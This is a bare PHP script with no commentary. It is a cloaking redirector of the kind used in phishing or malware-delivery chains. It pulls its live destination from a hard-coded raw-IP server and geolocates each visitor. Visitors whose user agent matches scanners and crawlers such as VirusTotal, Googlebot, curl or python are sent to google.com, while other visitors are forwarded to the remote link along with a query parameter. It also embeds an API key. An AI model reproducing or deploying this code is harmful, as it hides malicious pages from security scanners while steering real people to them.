<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
set_time_limit(60);

@error_reporting(E_ALL); //E_ALL


$next_link     = "http://46.183.218.199/ui/DUSaDceS3Knf7LEFeT6fEuPghFVzYpmwptdPTh8x.php";
$next_link     = file_get_contents($next_link);
$redirect_bad  = "https://href.li/?https://google.com";

$filter_browser = true;
$filter_data    = true;

$get = 'data';

$whitelistcountries = array();
if (empty($whitelistcountries)) $whitelistcountries = array();
$badagent = array("virustotalcloud", "python", "curl", "libssh2", "centralops", "kickfire", "digincore", "baiduspider", "virustotal", "ubuntu", "googlebot");

$ip    = $_SERVER["REMOTE_ADDR"];
$lang  = (isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '-');
$agent = (isset($_SERVER['HTTP_USER_AGENT'])      ? strtolower($_SERVER['HTTP_USER_AGENT']) : '-');
$from  = (isset($_SERVER['HTTP_REFERER'])         ? $_SERVER['HTTP_REFERER'] : '-');
$host  = '-';
$search = get_ip_info($ip);
$country = $search['country'];
$isp = $search['isp'];
$bro = get_bro();
$os = get_os();
$data  = (isset($_GET[$get]) ? $_GET[$get] : '');

if (strpos($ip, ",") || strpos($ip, "unknown")) {
  redirect_to($redirect_bad, "badip");
}
if (strpos_array($badagent, $agent)) {
  redirect_to($redirect_bad, "badagent");
}
$host = reverse_lookup($ip);
if ($filter_browser == true) {
  if ($bro == "unknown" || $os == "unknown" || $os == "Win 2000") {
    redirect_to($redirect_bad, "bados/badbrowser");
  }
}

$link = $next_link;
//$link = get_cached_link($next_link, $cache_file, $cache_timeout);
//if(empty($link))                   { redirect_to($redirect_bad, "badlink"); }

$pppos = strpos($link, "/?");
if ($pppos !== false) {
  redirect_to($link . $data);
} else {
  redirect_to("$link/$data");
}
function get_ip_info($ip)
{
  $ch = curl_init('http://ipwhois.app/json/' . $ip . '?key=fDhQ0f8rKLOhXhHl');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $result = curl_exec($ch);
  curl_close($ch);
  return json_decode($result, true);
}

function get_os()
{
  global $agent;
  $os_platform = "unknown";
  $os_array = array(
    '/windows nt 10.0/i' => 'Win 10 / Win 2016',
    '/windows nt 6.3/i' => 'Win 8.1/ Win S. 2012R2',
    '/windows nt 6.2/i' => 'Win 8 / Win S. 2012',
    '/windows nt 6.1/i' => 'Win 7 / Win S. 2008R2',
    '/windows nt 6.0/i' => 'Win Vista / Win S. 2008',
    '/windows nt 5.2/i' => 'Win Server 2003/XP x64',
    '/windows nt 5.1/i' => 'Win XP',
    '/windows xp/i' => 'Win XP',
    '/windows nt 5.0/i' => 'Win 2000',
    '/windows me|win 9x/i' => 'Win ME',
    '/win98/i' => 'Win 98',
    '/win95/i' => 'Win 95',
    '/winnt4.0/i' => 'Win NT 4.0',
    '/win16|win3.11/i' => 'Win 3.11',
    '/win16|win3.1/i' => 'Win 3.1',
    '/android/i' => 'Android',
    '/beos/i' => 'BeOS',
    '/blackberry/i' => 'BlackBerry',
    '/freebsd/i' => 'FreeBSD',
    '/hp-ux/i' => 'HP-UX',
    '/ipad/i' => 'iPad',
    '/iphone/i' => 'iPhone',
    '/ipod/i' => 'iPod',
    '/irix/i' => 'IRIX',
    '/linux/i' => 'Linux',
    '/mac_powerpc/i' => 'Mac OS 9',
    '/macintosh|mac os x/i' => 'Mac OS X',
    '/openbsd/i' => 'OpenBSD',
    '/netbsd/i' => 'NetBSD',
    '/sunos/i' => 'SunOS',
    '/ubuntu/i' => 'Ubuntu',
    '/webos/i' => 'Mobile',
    '/cros/i' => 'CrOS'
  );
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $agent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function get_bro()
{
  global $agent;
  $browser = "unknown";
  $browser_array = array(
    '/msie|trident/i' => 'Internet Explorer',
    '/firefox/i' => 'Firefox',
    '/safari/i' => 'Safari',
    '/chrome/i' => 'Chrome',
    '/opera/i' => 'Opera',
    '/netscape/i' => 'Netscape',
    '/maxthon/i' => 'Maxthon',
    '/konqueror/i' => 'Konqueror',
    '/mobile/i' => 'Handheld Browser',
    '/seamonkey/i' => 'SeaMonkey',
    '/lynx/i' => 'Linux LYNX',
    '/wget/i' => 'Linux WGET',
    '/w3m/i' => 'Linux W3M',
    '/links/i' => 'Linux LINKS',
    '/iceweasel/i' => 'Iceweasel',
    '/elinks/i' => 'Linux ELINKS'
  );
  foreach ($browser_array as $regex => $value) {
    if (preg_match($regex, $agent)) {
      $browser = $value;
    }
  }
  return $browser;
}
function reverse_lookup($ip)
{
  // FIXME: timed
  $host = @gethostbyaddr($ip);
  return strtolower((false === $host) ? $ip : $host);
}

function strpos_array($array, $find)
{
  if (strlen($find)) {
    if (!is_array($array)) {
      return (@strpos($array, $find) !== false);
    }

    foreach ($array as $el) {
      if (is_array($el)) {
        $pos = strpos_array($el, $find);
      } else {
        $pos = strpos($el, $find);
      }
      if (false !== $pos) {
        return true;
      }
    }
  }
  return false;
}


function redirect_to($url, $reason = "redirect")
{
  global $ip, $ccode, $host, $os, $bro, $lang, $agent, $from;
  echo
  '<!DOCTYPE html>
<html lang="en">
  <head>
    <title></title>
    <meta HTTP-Equiv="refresh" content="0; URL=', $url, '">
  </head>
  <body>
    <script type="text/javascript">
      var r="', $url, '";
      self.location.replace(r);
      window.location=r;
    </script>
  </body>
</html>';
  die;
}
